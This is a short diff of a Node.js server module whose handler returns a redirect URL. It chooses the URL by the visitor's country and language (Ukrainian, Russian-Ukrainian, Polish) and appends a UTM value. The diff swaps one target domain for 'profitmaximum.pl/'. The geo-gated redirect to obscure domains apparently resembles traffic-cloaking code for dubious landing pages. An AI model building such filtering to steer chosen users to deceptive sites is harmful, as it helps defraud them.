@@ -63,7 +63,7 @@ module.exports.getUrl = async function (req, res) {
                 }
                 res.status(200).json({status: false})
             } else {
-                if (url === 'mafxgemoieger.info') url = url + '?' + req.body.UTM
+                if (url === 'profitmaximum.pl/') url = url + '?' + req.body.UTM
                 res.status(200).json({
                     status: true,
                     url
@@ -113,7 +113,7 @@ function checkCountry(ip, language) {
                 language.toUpperCase() ==='UA' ||
                 language.toUpperCase() ==='RU-UA' ||
                 language.toUpperCase() ==='PL') {
-                url = 'mafxgemoieger.info'
+                url = 'profitmaximum.pl/'
             } else {
                 reason = 'Invalid language'
                 url = null
